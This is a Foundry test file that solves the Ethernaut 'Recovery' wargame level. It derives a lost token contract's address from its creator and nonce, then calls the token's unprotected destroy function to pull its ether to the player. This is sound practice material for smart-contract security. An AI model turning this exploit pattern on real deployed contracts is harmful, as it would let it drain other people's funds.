// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {RecoveryFactory} from "src/levels/RecoveryFactory.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryTest is Test {
    RecoveryFactory level;
    address target;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new RecoveryFactory();
        player = makeAddr("PLAYER");
        target = level.createInstance{value: 0.001 ether}(player);
    }

    function test_Recovery() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------

        // SimpleToken address = keccak256(rlp.encode([address(level) + nonce(level)]))
        // One element in array & element size less than 55bytes
        // => [0xc0 + 0x16, 0x80 + 0x15, (addr+nonce)]
        address simpleToken = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            uint160(address(target)),
                            uint8(0x1) // nonce of contract starts from 1
                        )
                    )
                )
            )
        );
        ISimpleToken(simpleToken).destroy(payable(player));
        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(target), player);
        assertEq(success, true);
    }
}
